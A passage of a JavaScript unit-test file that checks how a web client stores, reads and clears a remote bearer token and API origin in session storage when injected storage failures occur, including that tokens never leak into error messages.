          remoteAuthorizationRecord(oldBearer, "https://old-api.example"),
        ],
      ]);
      storage.setItem = (key, value) => {
        if (key !== REMOTE_AUTHORIZATION_SESSION_KEY) {
          storage.values.set(key, String(value));
          return;
        }
        if (mode === "throw-before") throw new Error("injected write failure");
        if (mode === "corrupt-then-throw") {
          storage.values.set(key, '{"version":1');
          throw new Error("injected interrupted write");
        }
        storage.values.set(key, String(value));
        if (mode === "throw-after") throw new Error("injected post-write failure");
      };
      globalThis.sessionStorage = storage;
      let configureError;
      try {
        configureVibeComfyRemoteBearer(newBearer, {
          apiOrigin: "https://new-api.example",
          persistForTab: true,
        });
      } catch (caught) {
        configureError = caught;
      }
      if (mode === "success") {
        assert.equal(configureError, undefined);
      } else {
        assert.match(configureError?.message, /could not be stored/);
        assert.equal(configureError.message.includes(oldBearer), false);
        assert.equal(configureError.message.includes(newBearer), false);
      }

      _resetCsrfCapabilityForTests();
      const calls = [];
      globalThis.fetch = async (url, options = {}) => {
        calls.push({ url: String(url), options: structuredClone(options) });
        return response({ ok: true });
      };
      if (expected === "invalid") {
        await assert.rejects(
          vibecomfyFetch("/vibecomfy/agent/status"),
          /persisted remote authorization is corrupt/,
        );
        assert.equal(calls.length, 0);
      } else {
        await vibecomfyFetch("/vibecomfy/agent/status");
        const expectedOrigin = expected === "old"
          ? "https://old-api.example"
          : "https://new-api.example";
        const expectedBearer = expected === "old" ? oldBearer : newBearer;
        assert.equal(calls.length, 1);
        assert.equal(calls[0].url, `${expectedOrigin}/vibecomfy/agent/status`);
        assert.equal(
          calls[0].options.headers.Authorization,
          `Bearer ${expectedBearer}`,
        );
      }
    }
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("legacy cleanup failures cannot alter the committed versioned authority", async () => {
  const oldBearer = "legacy-old-capability-0123456789012345";
  const newBearer = "committed-new-capability-012345678901";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  try {
    for (const failedKey of [
      REMOTE_BEARER_SESSION_KEY,
      REMOTE_API_ORIGIN_SESSION_KEY,
    ]) {
      _resetCsrfCapabilityForTests();
      const storage = makeSessionStorage([
        [REMOTE_BEARER_SESSION_KEY, oldBearer],
        [REMOTE_API_ORIGIN_SESSION_KEY, "https://old-api.example"],
      ]);
      const removeItem = storage.removeItem.bind(storage);
      storage.removeItem = (key) => {
        if (key === failedKey) throw new Error("injected cleanup failure");
        removeItem(key);
      };
      globalThis.sessionStorage = storage;
      configureVibeComfyRemoteBearer(newBearer, {
        apiOrigin: "https://new-api.example",
        persistForTab: true,
      });
      _resetCsrfCapabilityForTests();
      const calls = [];
      globalThis.fetch = async (url, options = {}) => {
        calls.push({ url: String(url), options: structuredClone(options) });
        return response({ ok: true });
      };
      await vibecomfyFetch("/vibecomfy/agent/status");
      assert.equal(calls[0].url, "https://new-api.example/vibecomfy/agent/status");
      assert.equal(calls[0].options.headers.Authorization, `Bearer ${newBearer}`);
    }
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("read failures never combine versioned and legacy authority", async () => {
  const bearer = "read-failure-capability-012345678901234";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  const calls = [];
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  try {
    _resetCsrfCapabilityForTests();
    globalThis.sessionStorage = {
      getItem(key) {
        if (key === REMOTE_AUTHORIZATION_SESSION_KEY) return null;
        if (key === REMOTE_BEARER_SESSION_KEY) return bearer;
        throw new Error("injected legacy origin read failure");
      },
    };
    await assert.rejects(
      vibecomfyFetch("/vibecomfy/agent/status"),
      /could not be read safely/,
    );
    assert.equal(calls.length, 0);

    _resetCsrfCapabilityForTests();
    globalThis.sessionStorage = {
      getItem(key) {
        if (key === REMOTE_AUTHORIZATION_SESSION_KEY) return null;
        throw new Error("injected unavailable legacy storage");
      },
    };
    await vibecomfyFetch("/vibecomfy/agent/status");
    assert.equal(calls.length, 1);
    assert.equal(calls[0][1].headers, undefined);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("clear interruption preserves a complete record or removes authority", async () => {
  const bearer = "clear-interruption-capability-0123456789";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  const removalKeys = [
    REMOTE_BEARER_SESSION_KEY,
    REMOTE_API_ORIGIN_SESSION_KEY,
    REMOTE_AUTHORIZATION_SESSION_KEY,
  ];
  try {
    for (const failedKey of removalKeys) {
      for (const timing of ["before", "after"]) {
        _resetCsrfCapabilityForTests();
        const storage = makeSessionStorage([
          [REMOTE_BEARER_SESSION_KEY, "ignored-legacy-bearer"],
          [REMOTE_API_ORIGIN_SESSION_KEY, "https://ignored-legacy.example"],
          [
            REMOTE_AUTHORIZATION_SESSION_KEY,
            remoteAuthorizationRecord(bearer, "https://api.example"),
          ],
        ]);
        const removeItem = storage.removeItem.bind(storage);
        storage.removeItem = (key) => {
          if (key !== failedKey) {
            removeItem(key);
            return;
          }
          if (timing === "after") removeItem(key);
          throw new Error("injected clear interruption");
        };
        globalThis.sessionStorage = storage;
        let clearError;
        try {
          clearVibeComfyRemoteBearer();
        } catch (caught) {
          clearError = caught;
        }
        assert.match(clearError?.message, /could not be cleared safely/);
        assert.equal(clearError.message.includes(bearer), false);

        _resetCsrfCapabilityForTests();
        const calls = [];
        globalThis.fetch = async (url, options = {}) => {
          calls.push({ url: String(url), options: structuredClone(options) });
          return response({ ok: true });
        };
        await vibecomfyFetch("/vibecomfy/agent/status");
        assert.equal(calls.length, 1);
        const atomicRecordRemains = storage.values.has(
          REMOTE_AUTHORIZATION_SESSION_KEY,
        );
        if (atomicRecordRemains) {
          assert.equal(calls[0].url, "https://api.example/vibecomfy/agent/status");
          assert.equal(calls[0].options.headers.Authorization, `Bearer ${bearer}`);
        } else {
          assert.equal(
            calls[0].url,
            "http://localhost:8188/vibecomfy/agent/status",
          );
          assert.equal(calls[0].options.headers, undefined);
        }
      }
    }
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});
